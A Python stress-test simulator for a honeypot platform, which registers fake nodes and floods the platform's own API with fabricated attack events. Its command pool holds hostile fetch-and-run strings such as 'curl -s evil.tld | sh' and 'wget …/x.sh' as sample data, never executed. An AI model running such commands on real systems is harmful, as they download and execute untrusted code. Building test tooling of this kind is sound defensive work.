#!/usr/bin/env python3
"""
HoneyBee-Enhanced load / variety simulator  (hb_sim.py)
=======================================================

A never-ending simulator that drives EVERY system signal through the *real*
core pipeline so you can stress-test the whole platform — dashboard, analytics,
alerts, and Telegram notifications — from many different source IPs.

It:
  • logs in (or registers an admin org) over the REST API,
  • registers N fake nodes and opens real node-protocol sockets (4-byte
    big-endian length-prefixed JSON, exact `node_auth` handshake),
  • keeps nodes ONLINE with randomized CPU/MEM/DISK heartbeats (so node metrics
    move), and periodically drops/reconnects some to fire offline→online,
  • deploys honeypots via REST and emits `pot_status` installing→running,
  • floods `pot_event`s from random IPs across every honeypot + event type with
    realistic payloads (logins, commands, malware, web attacks, …),
  • raises alerts of every severity, and performs audited REST actions.

Stdlib only (no pip install). Ctrl-C stops cleanly.

USAGE
  python hb_sim.py --url http://localhost:5400 --node-addr localhost:9001 \
                   --email admin@sim.local --password simpass123 --nodes 5 --eps 8

  # TLS node socket with a self-signed core cert + HTTPS REST:
  python hb_sim.py --url https://core.local:8443 --node-addr core.local:9001 \
                   --tls --insecure ...

Point --url at the core HTTP API and --node-addr at the core NODE server
(default node port 9001). The first registered user becomes admin (all perms),
so a fresh DB just works.
"""

import argparse
import json
import random
import select
import signal
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

STOP = threading.Event()
MAX_FRAME = 10 * 1024 * 1024
PROTO_VERSION = 4

STATS = {"events": 0, "alerts": 0, "deploys": 0}
STATS_LOCK = threading.Lock()

# Recurring "attacker" IPs so a handful of sources dominate (realistic top-attackers
# clustering) instead of every event being a brand-new random IP. Filled in main().
HOT_IPS = []


def bump(key, n=1):
    with STATS_LOCK:
        STATS[key] += n


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def vlog(verbose, msg):
    if verbose:
        log(msg)


def now_rfc3339():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


# ────────────────────────────── wire protocol ──────────────────────────────
def send_message(sock, msg_type, payload):
    env = {"version": PROTO_VERSION, "type": msg_type, "timestamp": now_rfc3339(), "payload": payload}
    body = json.dumps(env, separators=(",", ":")).encode("utf-8")
    if not (0 < len(body) <= MAX_FRAME):
        raise ValueError("frame size out of bounds")
    sock.sendall(struct.pack(">I", len(body)) + body)  # big-endian uint32 length prefix


def _read_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed")
        buf += chunk
    return bytes(buf)


def read_message(sock):
    (size,) = struct.unpack(">I", _read_exact(sock, 4))
    if size == 0 or size > MAX_FRAME:
        raise ValueError("bad frame size")
    return json.loads(_read_exact(sock, size))


def open_node_socket(node_addr, token, name, tls, insecure):
    host, _, port = node_addr.rpartition(":")
    raw = socket.create_connection((host or "localhost", int(port)), timeout=15)
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    if tls:
        ctx = ssl.create_default_context()
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=(None if insecure else host))
    else:
        sock = raw
    # First frame MUST be node_auth; then read auth_result synchronously.
    send_message(sock, "node_auth", {"token": token, "hostname": name, "os": "linux", "arch": "amd64"})
    env = read_message(sock)
    if env.get("type") != "auth_result":
        sock.close()
        raise ConnectionError(f"expected auth_result, got {env.get('type')}")
    ar = env.get("payload") or {}
    if not ar.get("success"):
        sock.close()
        raise ConnectionError(f"auth rejected: {ar.get('message')}")
    sock.settimeout(None)  # blocking from here; select() gates reads
    return sock, ar.get("node_id")


# ────────────────────────────── REST client ────────────────────────────────
class Rest:
    def __init__(self, base, insecure, verbose):
        self.base = base.rstrip("/")
        self.token = None
        self.org_id = None
        self.role = None
        self.verbose = verbose
        self.ctx = None
        if self.base.lower().startswith("https") and insecure:
            self.ctx = ssl.create_default_context()
            self.ctx.check_hostname = False
            self.ctx.verify_mode = ssl.CERT_NONE

    def call(self, method, path, body=None, auth=True):
        url = self.base + "/api/v1" + path
        data = json.dumps(body).encode() if body is not None else None
        req = urllib.request.Request(url, data=data, method=method)
        if data is not None:
            req.add_header("Content-Type", "application/json")
        if auth and self.token:
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, timeout=20, context=self.ctx) as r:
                raw = r.read()
                return r.status, (json.loads(raw) if raw else {})
        except urllib.error.HTTPError as e:
            raw = e.read()
            try:
                j = json.loads(raw)
            except Exception:
                j = {"error": raw.decode(errors="replace")[:200]}
            return e.code, j
        except Exception as e:
            return 0, {"error": str(e)}

    def bootstrap_auth(self, email, password, org):
        st, j = self.call("POST", "/auth/login", {"email": email, "password": password}, auth=False)
        if st == 200 and j.get("access_token"):
            self.token, self.org_id, self.role = j["access_token"], j.get("org_id"), j.get("role")
            return "login"
        st, j = self.call("POST", "/auth/register",
                          {"org_name": org, "email": email, "password": password, "name": "Sim Admin"}, auth=False)
        if st in (200, 201) and j.get("access_token"):
            self.token, self.org_id, self.role = j["access_token"], j.get("org_id"), j.get("role")
            return "register"
        raise SystemExit(f"auth failed (login + register both failed): {j}")

    def register_node(self, name, record_logs=False):
        st, j = self.call("POST", "/nodes", {"name": name, "record_logs": record_logs})
        if st in (200, 201) and j.get("token"):
            return j["id"], j["token"]
        raise RuntimeError(f"register node '{name}' failed: {st} {j}")

    def deploy(self, node_id, htype):
        st, j = self.call("POST", f"/nodes/{node_id}/deployments",
                          {"honeypot_type": htype, "config": {}, "auto_start": True})
        if st in (200, 201):
            return j.get("deployment_id"), j.get("pot_id")
        return None, None

    def create_alert(self, sev):
        st, j = self.call("POST", "/alerts", {
            "severity": sev, "title": f"Simulated {sev} alert",
            "message": f"hb_sim raised a {sev} alert at {now_rfc3339()}",
            "source": "simulator", "source_ref": f"sim-{random.randint(1000, 999999)}"})
        return j.get("id") if st in (200, 201) else None


# ───────────────────────────── variety pools ───────────────────────────────
HONEYPOT_TYPES = ["cowrie", "honnypotter", "webtrap"]
EVENT_TYPES = {
    "cowrie": ["cowrie.login.success", "cowrie.login.failed", "cowrie.command.input",
               "cowrie.session.file_download", "cowrie.session.closed"],
    "honnypotter": ["honnypotter.login.failed", "honnypotter.xmlrpc.attack", "honnypotter.bruteforce.detected"],
    "webtrap": ["webtrap.request", "webtrap.file_upload", "webtrap.canary_hit"],
}
DEFAULT_DST_PORT = {"cowrie": 2222, "honnypotter": 8080, "webtrap": 8088}
SEVERITIES = ["critical", "high", "medium", "low", "info"]
USERNAMES = ["root", "admin", "user", "oracle", "pi", "ubuntu", "test", "postgres", "git", "ftp", "administrator"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "12345678", "qwerty", "letmein", "", "P@ssw0rd", "changeme"]
COMMANDS = ["uname -a", "wget http://203.0.113.9/x.sh", "cat /etc/passwd", "whoami", "curl -s evil.tld | sh",
            "cd /tmp && chmod +x m && ./m", "ls -la", "id", "crontab -l", "ps aux"]
MALWARE = ["x.sh", "mirai.arm", "kinsing", "xmrig", "b.bin", "setup.exe", "ld-musl.so"]
XMLRPC = ["wp.getUsersBlogs", "system.multicall", "pingback.ping"]
WEB_PATHS = ["/wp-login.php", "/admin", "/.env", "/phpmyadmin", "/api/v1/users", "/shell.php", "/.git/config", "/actuator/env"]
HEURISTICS = ["sqli", "xss", "rce", "lfi", "ssrf", "log4shell", "ssti"]
USER_AGENTS = ["curl/7.88", "python-requests/2.31", "Mozilla/5.0", "Go-http-client/1.1", "sqlmap/1.7", "Nmap NSE"]
HTTP_METHODS = ["GET", "POST", "PUT", "HEAD"]


# Real, allocated public /16 prefixes spread across ~30 countries so the live
# attack map populates with geolocatable dots worldwide. MaxMind resolves these
# to a country/city; private/reserved/RFC5737 doc ranges do NOT geolocate, so we
# deliberately avoid them — otherwise the map would stay half-empty.
PUBLIC_PREFIXES = [
    "8.8", "4.2", "23.20", "50.16", "104.16", "63.10",          # USA
    "142.0", "24.48", "70.48",                                   # Canada
    "77.0", "85.10", "91.0", "217.0",                            # Germany
    "79.0", "93.32", "151.0",                                    # Italy
    "80.24", "83.32", "88.0",                                    # Spain
    "90.0", "176.0", "194.0", "92.0",                            # France
    "51.0", "81.0", "86.0", "212.0",                             # UK
    "31.0", "82.0", "145.0",                                     # Netherlands
    "78.64", "81.224", "194.71",                                 # Sweden
    "95.0", "178.0", "5.45", "188.0",                            # Russia
    "31.40", "46.118", "176.36",                                 # Ukraine
    "5.172", "151.236",                                          # Poland
    "78.160", "88.224", "176.232",                               # Turkey
    "1.2", "14.0", "27.0", "61.0", "114.114", "123.0",           # China
    "126.0", "133.0", "153.0", "210.0",                          # Japan
    "1.16", "112.0", "175.192", "211.32",                        # South Korea
    "49.0", "59.0", "117.0", "182.0",                            # India
    "36.64", "114.4", "180.240",                                 # Indonesia
    "14.160", "113.160", "123.16",                               # Vietnam
    "1.120", "27.32", "139.130",                                 # Australia
    "177.0", "187.0", "200.0", "201.0",                          # Brazil
    "187.128", "189.128", "201.128",                             # Mexico
    "2.48", "94.200", "217.165",                                 # UAE
    "5.42", "37.16", "94.56",                                    # Saudi Arabia
    "2.144", "5.106", "91.98",                                   # Iran
    "41.32", "156.160", "197.32",                                # Egypt
    "41.0", "105.0", "196.0", "102.0",                           # Africa (misc)
]


def random_ip():
    pre = random.choice(PUBLIC_PREFIXES)
    return f"{pre}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def rand_sha():
    return "".join(random.choice("0123456789abcdef") for _ in range(64))


def build_data(pot_type, event_type):
    if event_type in ("cowrie.login.success", "cowrie.login.failed", "honnypotter.login.failed"):
        return {"username": random.choice(USERNAMES), "password": random.choice(PASSWORDS)}
    if event_type == "cowrie.command.input":
        return {"command": random.choice(COMMANDS)}
    if event_type == "cowrie.session.file_download":
        return {"dst_file": random.choice(MALWARE), "url": f"http://{random_ip()}/{random.choice(MALWARE)}", "sha256": rand_sha()}
    if event_type == "cowrie.session.closed":
        return {"duration": random.randint(1, 1800), "bytes": random.randint(40, 500000)}
    if event_type == "honnypotter.xmlrpc.attack":
        return {"method": random.choice(XMLRPC), "username": random.choice(USERNAMES), "password": random.choice(PASSWORDS)}
    if event_type == "honnypotter.bruteforce.detected":
        return {"burst_count": random.randint(20, 500), "window": "60s"}
    if event_type == "webtrap.request":
        return {"method": random.choice(HTTP_METHODS), "path": random.choice(WEB_PATHS),
                "headers": {"User-Agent": random.choice(USER_AGENTS)},
                "tags": random.sample(HEURISTICS, k=random.randint(0, 2))}
    if event_type == "webtrap.file_upload":
        return {"upload_name": random.choice(["shell.php", "cmd.jsp", "x.aspx"]), "size": random.randint(120, 90000), "tags": ["rce"]}
    if event_type == "webtrap.canary_hit":
        return {"canary_cred_used": True, "username": random.choice(USERNAMES), "traced_from": random_ip()}
    return {"note": "simulated"}


def pick_ip():
    # 70% of traffic from recurring "hot" sources (biased to the hottest third),
    # 30% fresh random IPs — mirrors how real scans cluster around a few actors.
    if HOT_IPS and random.random() < 0.7:
        pool = HOT_IPS[: max(1, len(HOT_IPS) // 3)] if random.random() < 0.5 else HOT_IPS
        return random.choice(pool)
    return random_ip()


def make_event(ns, pot, ip=None, et=None, ts=None):
    et = et or random.choice(EVENT_TYPES[pot["pot_type"]])
    return {
        "node_id": ns.node_id, "pot_id": pot["pot_id"], "pot_type": pot["pot_type"],
        "event_type": et, "source_ip": ip or pick_ip(),
        "src_port": random.randint(1024, 65535), "dst_port": DEFAULT_DST_PORT.get(pot["pot_type"], 0),
        "data": build_data(pot["pot_type"], et), "event_time": ts or now_rfc3339(),
    }


# ────────────────────────────── node state ─────────────────────────────────
class NodeState:
    def __init__(self, name, rest_id, token):
        self.name = name
        self.rest_id = rest_id
        self.token = token
        self.sock = None
        self.node_id = None
        self.connected = False
        self.wlock = threading.Lock()
        self.pots = []  # [{pot_id, pot_type, deployment_id}]
        self.potslock = threading.Lock()
        self.uptime = random.randint(3600, 800000)
        self.force_reconnect = False

    def send(self, mtype, payload):
        if not self.connected or self.sock is None:
            return False
        try:
            with self.wlock:
                send_message(self.sock, mtype, payload)
            return True
        except Exception:
            self.connected = False
            return False


class NodeWorker(threading.Thread):
    def __init__(self, ns, cfg):
        super().__init__(daemon=True)
        self.ns = ns
        self.cfg = cfg

    def run(self):
        backoff = 1.0
        while not STOP.is_set():
            self.ns.force_reconnect = False
            try:
                sock, node_id = open_node_socket(self.cfg.node_addr, self.ns.token, self.ns.name,
                                                 self.cfg.tls, self.cfg.insecure)
            except Exception as e:
                vlog(self.cfg.verbose, f"{self.ns.name} connect failed: {e}")
                if STOP.wait(backoff):
                    break
                backoff = min(backoff * 2, 30)
                continue
            self.ns.sock, self.ns.node_id, self.ns.connected = sock, node_id, True
            backoff = 1.0
            log(f"● {self.ns.name} ONLINE (node_id={node_id})")
            threading.Thread(target=self._heartbeat, daemon=True).start()
            self._serve(sock)
            self.ns.connected = False
            try:
                sock.close()
            except Exception:
                pass
            if STOP.is_set():
                break
            log(f"○ {self.ns.name} offline")
            pause = random.uniform(self.cfg.offline_min, self.cfg.offline_max) if self.ns.force_reconnect else 1.0
            if STOP.wait(pause):
                break

    def _heartbeat(self):
        while self.ns.connected and not STOP.is_set():
            ok = self.ns.send("heartbeat", {
                "node_id": self.ns.node_id,
                "cpu_pct": round(random.uniform(1, 95), 1),
                "mem_pct": round(random.uniform(10, 90), 1),
                "disk_pct": round(random.uniform(20, 85), 1),
                "uptime_secs": self.ns.uptime})
            if not ok:
                break
            self.ns.uptime += self.cfg.hb_interval
            if STOP.wait(self.cfg.hb_interval + random.uniform(-2, 2)):
                break

    def _serve(self, sock):
        while self.ns.connected and not STOP.is_set() and not self.ns.force_reconnect:
            try:
                ready, _, _ = select.select([sock], [], [], 2.0)
            except Exception:
                break
            if STOP.is_set() or self.ns.force_reconnect:
                break
            if not ready:
                continue
            try:
                env = read_message(sock)
            except Exception:
                break
            if env and env.get("type") == "task_assign":
                tid = (env.get("payload") or {}).get("task_id")
                if tid is not None:  # ack so deployments flip to running / tasks clear
                    self.ns.send("task_result", {"task_id": tid, "node_id": self.ns.node_id, "status": "completed", "message": ""})


# ─────────────────────────── background workers ────────────────────────────
def deploy_one(rest, ns, registry):
    htype = random.choice(HONEYPOT_TYPES)
    did, pid = rest.deploy(ns.rest_id, htype)
    if not pid:
        return
    with ns.potslock:
        ns.pots.append({"pot_id": pid, "pot_type": htype, "deployment_id": did})
    if did is not None:
        registry["deployments"].append((ns, pid, htype, did))
    ns.send("pot_status", {"node_id": ns.node_id, "pot_id": pid, "pot_type": htype, "status": "installing", "message": ""})
    STOP.wait(1.5)
    ns.send("pot_status", {"node_id": ns.node_id, "pot_id": pid, "pot_type": htype, "status": "running", "message": ""})
    bump("deploys")
    log(f"  deployed {htype} → {pid} on {ns.name}")


BURST_ET = {"cowrie": "cowrie.login.failed", "honnypotter": "honnypotter.login.failed", "webtrap": "webtrap.request"}


def _live_pairs(nodes):
    out = []
    for ns in nodes:
        if ns.connected:
            with ns.potslock:
                for p in ns.pots:
                    out.append((ns, p))
    return out


def flood_worker(nodes, cfg):
    # Organic pacing: exponential (Poisson) inter-arrival gaps around the target
    # rate, periodic brute-force/scan bursts from a single IP, and random lulls —
    # so traffic never looks like a fixed-interval robot.
    mean = 1.0 / max(cfg.eps, 0.001)
    while not STOP.is_set():
        pairs = _live_pairs(nodes)
        if pairs:
            ns, pot = random.choice(pairs)
            if random.random() < 0.12:
                # burst: one attacker hammers one pot (brute force / scan)
                ip = pick_ip()
                et = BURST_ET.get(pot["pot_type"])
                for _ in range(random.randint(6, 30)):
                    if STOP.is_set() or not ns.connected:
                        break
                    if ns.send("pot_event", make_event(ns, pot, ip=ip, et=et)):
                        bump("events")
                    if STOP.wait(random.uniform(0.02, 0.15)):
                        return
            elif ns.send("pot_event", make_event(ns, pot)):
                bump("events")
        gap = random.expovariate(1.0 / mean) if mean > 0 else 0.0
        if random.random() < 0.04:
            gap += random.uniform(2.0, 9.0)  # occasional lull
        if STOP.wait(min(gap, 12.0)):
            break


def backfill(nodes, cfg):
    # Seed a realistic ~Nh history so the hourly Attack Timeline shows an actual
    # curve immediately (a single current-hour bucket renders as an empty chart).
    import math
    pairs = _live_pairs(nodes)
    if not pairs or cfg.backfill_hours <= 0:
        return
    now = time.time()
    total = 0
    for h in range(cfg.backfill_hours, 0, -1):
        if STOP.is_set():
            break
        weight = 0.35 + 0.65 * abs(math.sin(((h % 24) / 24.0) * math.pi))  # diurnal shape
        if random.random() < 0.15:
            weight += random.uniform(1.0, 2.5)  # spike hour
        for _ in range(max(0, int(cfg.backfill_per_hour * weight))):
            if STOP.is_set():
                break
            ns, pot = random.choice(pairs)
            if not ns.connected:
                continue
            ts_epoch = now - h * 3600 + random.uniform(0, 3600)
            ts = datetime.fromtimestamp(ts_epoch, timezone.utc).isoformat().replace("+00:00", "Z")
            if ns.send("pot_event", make_event(ns, pot, ts=ts)):
                bump("events")
                total += 1
    log(f"  backfilled {total} historical events over {cfg.backfill_hours}h → timeline curve")


def stats_worker(nodes):
    last = 0
    while not STOP.is_set():
        if STOP.wait(10):
            break
        with STATS_LOCK:
            ev, al, dp = STATS["events"], STATS["alerts"], STATS["deploys"]
        rate = (ev - last) / 10.0
        last = ev
        online = sum(1 for n in nodes if n.connected)
        log(f"▲ {ev} events (~{rate:.1f}/s) · {al} alerts · {dp} deploys · nodes {online}/{len(nodes)} online")


def deploy_worker(rest, nodes, cfg, registry):
    while not STOP.is_set():
        if STOP.wait(cfg.deploy_interval):
            break
        live = [n for n in nodes if n.connected]
        if not live:
            continue
        ns = random.choice(live)
        # 30%: churn an existing pot's status; else deploy a new one
        if ns.pots and random.random() < 0.3:
            with ns.potslock:
                pot = random.choice(ns.pots)
            status = random.choice(["stopped", "failed", "running", "running"])
            ns.send("pot_status", {"node_id": ns.node_id, "pot_id": pot["pot_id"], "pot_type": pot["pot_type"],
                                   "status": status, "message": f"sim transition → {status}"})
        else:
            deploy_one(rest, ns, registry)


def alert_worker(rest, cfg, registry):
    i = 0
    while not STOP.is_set():
        if STOP.wait(cfg.alert_interval):
            break
        sev = SEVERITIES[i % len(SEVERITIES)]
        i += 1
        aid = rest.create_alert(sev)
        if aid:
            registry["alerts"].append(aid)
            bump("alerts")
            vlog(cfg.verbose, f"  alert [{sev}] #{aid}")


def audit_worker(rest, cfg, registry):
    while not STOP.is_set():
        if STOP.wait(cfg.audit_interval):
            break
        # acknowledge a random recent alert (audited)
        if registry["alerts"]:
            aid = random.choice(registry["alerts"][-20:])
            rest.call("POST", f"/alerts/{aid}/acknowledge")
        # restart a random deployment (audited, pots.deploy)
        if registry["deployments"]:
            ns, pid, htype, did = random.choice(registry["deployments"][-30:])
            rest.call("POST", f"/deployments/{did}/restart")
            if ns.connected:
                ns.send("pot_status", {"node_id": ns.node_id, "pot_id": pid, "pot_type": htype, "status": "running", "message": "restarted"})


def churn_worker(nodes, cfg):
    while not STOP.is_set():
        if STOP.wait(60):
            break
        for ns in nodes:
            if ns.connected and random.random() < cfg.churn_rate:
                log(f"⟳ churn: dropping {ns.name}")
                ns.force_reconnect = True
                try:
                    ns.sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    ns.sock.close()
                except Exception:
                    pass


# ──────────────────────────────── main ─────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="HoneyBee-Enhanced never-ending signal simulator")
    ap.add_argument("--url", default="http://localhost:5400", help="core HTTP API base (REST), e.g. http://localhost:5400")
    ap.add_argument("--node-addr", default="localhost:9001", help="core node server host:port")
    ap.add_argument("--email", default="sim-admin@honeybee.local")
    ap.add_argument("--password", default="simulator123")
    ap.add_argument("--org-name", default="SimOrg")
    ap.add_argument("--nodes", type=int, default=5)
    ap.add_argument("--eps", type=float, default=6.0, help="avg pot events per second (organic, bursty — not fixed-interval)")
    ap.add_argument("--flood-threads", type=int, default=2)
    ap.add_argument("--backfill-hours", type=int, default=24, help="seed this many hours of history so the timeline shows a curve (0 = off)")
    ap.add_argument("--backfill-per-hour", type=int, default=50, help="avg backfilled events per hour")
    ap.add_argument("--hot-ips", type=int, default=18, help="number of recurring attacker IPs")
    ap.add_argument("--hb-interval", type=float, default=20.0)
    ap.add_argument("--churn-rate", type=float, default=0.05, help="prob/min a node drops & reconnects")
    ap.add_argument("--offline-min", type=float, default=8.0)
    ap.add_argument("--offline-max", type=float, default=35.0)
    ap.add_argument("--deploy-interval", type=float, default=25.0)
    ap.add_argument("--alert-interval", type=float, default=20.0)
    ap.add_argument("--audit-interval", type=float, default=35.0)
    ap.add_argument("--tls", action="store_true", help="use TLS for the node socket")
    ap.add_argument("--insecure", action="store_true", help="skip TLS cert verification (node + https REST)")
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--log-analyzer", action="store_true",
                    help="create nodes with record_logs=True so their events/pot_logs forward to the Log Analyzer "
                         "(requires the LA backend reachable at core's log_analyzer.url)")
    ap.add_argument("--verbose", action="store_true")
    cfg = ap.parse_args()
    if cfg.seed is not None:
        random.seed(cfg.seed)
    HOT_IPS.extend(random_ip() for _ in range(max(1, cfg.hot_ips)))

    signal.signal(signal.SIGINT, lambda *_: STOP.set())
    try:
        signal.signal(signal.SIGTERM, lambda *_: STOP.set())
    except Exception:
        pass

    rest = Rest(cfg.url, cfg.insecure, cfg.verbose)
    log(f"auth → {cfg.url}")
    mode = rest.bootstrap_auth(cfg.email, cfg.password, cfg.org_name)
    if mode == "login":
        log(f"  ✓ logged in as {cfg.email} · org_id={rest.org_id} · role={rest.role}")
    else:
        log(f"  ⚠ no such user — REGISTERED A NEW ORG (org_id={rest.org_id}) as {cfg.email}")
        log("  ⚠ ────────────────────────────────────────────────────────────────")
        log("  ⚠ This is a SEPARATE org from your dashboard. The simulated nodes,")
        log("  ⚠ events, alerts and Telegram notifications will NOT show in your")
        log("  ⚠ dashboard or fire your Telegram bot — they live in this new org.")
        log("  ⚠ To target YOUR org: stop (Ctrl-C) and re-run with the SAME")
        log("  ⚠ email + password you use to LOG IN to the dashboard.")
        log("  ⚠ ────────────────────────────────────────────────────────────────")

    nodes = []
    for i in range(1, cfg.nodes + 1):
        try:
            nid, tok = rest.register_node(f"sim-node-{i}", record_logs=cfg.log_analyzer)
            nodes.append(NodeState(f"sim-node-{i}", nid, tok))
            vlog(cfg.verbose, f"  registered sim-node-{i} (id={nid}, log_analyzer={cfg.log_analyzer})")
        except Exception as e:
            log(f"  ! {e}")
    if not nodes:
        raise SystemExit("no nodes registered — aborting")
    log(f"registered {len(nodes)} node(s); connecting to {cfg.node_addr} ...")

    for ns in nodes:
        NodeWorker(ns, cfg).start()

    # wait briefly for sockets to come up
    deadline = time.time() + 15
    while time.time() < deadline and not STOP.is_set():
        if all(n.connected for n in nodes):
            break
        STOP.wait(0.5)
    online = [n for n in nodes if n.connected]
    log(f"{len(online)}/{len(nodes)} nodes online — seeding deployments")

    registry = {"deployments": [], "alerts": []}
    for ns in online:
        if STOP.is_set():
            break
        deploy_one(rest, ns, registry)
        if random.random() < 0.5:
            deploy_one(rest, ns, registry)

    if cfg.backfill_hours > 0 and not STOP.is_set():
        log(f"backfilling ~{cfg.backfill_hours}h of history so the timeline shows a curve …")
        backfill(online, cfg)

    log(f"starting simulation — ~{cfg.eps} events/s (organic, bursty) across {len(nodes)} nodes. Ctrl-C to stop.")
    workers = []
    for _ in range(max(1, cfg.flood_threads)):
        workers.append(threading.Thread(target=flood_worker, args=(nodes, cfg), daemon=True))
    workers.append(threading.Thread(target=deploy_worker, args=(rest, nodes, cfg, registry), daemon=True))
    workers.append(threading.Thread(target=alert_worker, args=(rest, cfg, registry), daemon=True))
    workers.append(threading.Thread(target=audit_worker, args=(rest, cfg, registry), daemon=True))
    workers.append(threading.Thread(target=churn_worker, args=(nodes, cfg), daemon=True))
    workers.append(threading.Thread(target=stats_worker, args=(nodes,), daemon=True))
    for w in workers:
        w.start()

    while not STOP.is_set():
        STOP.wait(1)

    log("shutting down …")
    for ns in nodes:
        ns.connected = False
        try:
            ns.sock.close()
        except Exception:
            pass
    time.sleep(0.5)
    log("bye 🐝")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        STOP.set()
